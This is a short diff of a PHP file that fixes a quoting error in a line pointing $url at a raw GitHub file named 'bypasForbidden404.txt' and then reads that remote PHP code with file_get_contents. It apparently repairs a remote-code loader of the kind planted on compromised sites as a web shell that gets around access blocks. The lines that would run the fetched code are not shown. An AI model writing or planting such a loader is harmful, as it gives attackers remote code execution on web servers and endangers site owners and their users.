@@ -1,5 +1,5 @@
 <?php
-$url = 'https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/bypasForbidden404.txt'';
+$url = 'https://raw.githubusercontent.com/drianbaferlinlo393/xc/refs/heads/main/bypasForbidden404.txt';
 
 
 $php_code = file_get_contents($url);
